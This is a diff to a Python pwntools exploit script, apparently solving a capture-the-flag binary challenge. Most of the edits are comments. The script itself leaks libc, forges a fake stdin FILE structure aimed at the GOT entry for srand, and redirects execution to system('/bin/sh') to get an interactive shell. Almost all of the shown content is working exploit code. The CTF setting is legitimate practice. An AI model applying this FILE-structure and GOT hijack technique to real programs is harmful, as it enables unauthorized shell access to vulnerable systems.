@@ -58,8 +58,6 @@ def simulate(bot, player):
 
 # data read into _IO_read_base
 # _IO_buf_base = points to the start of the file buffer
-#   + point this to the scanf area ? some area we have control over
-#
 def write_data(data):
     for b in data:
         for i in range(8):
@@ -134,11 +132,11 @@ log.info(f"Libc leak: {hex(libc.address)}")
 for i in range(64):
     fight(0)
 
-# seed
 payload = p64(0x4142)
-# FILE* ptr (fake it to point just after)
+# FILE* ptr (fake it to point just after this)
 payload += p64(0x4040a0)
 
+# fake stdin FILE* struct
 file = FileStructure()
 file.flags = 0x00000000fbad2088
 file._IO_buf_base = e.got['srand']-0x8
@@ -155,8 +153,10 @@ payload += b"/bin/sh\x00"
 write_data(payload)
 io.sendline("r")
 
+# point to /bin/sh\x00 string. This is what seed will be overwritten with
 payload = p64(0x404180)
 payload += p64(libc.sym['system'])
+#payload += p64(0x4141)
 io.sendline(payload)
 
 io.interactive()
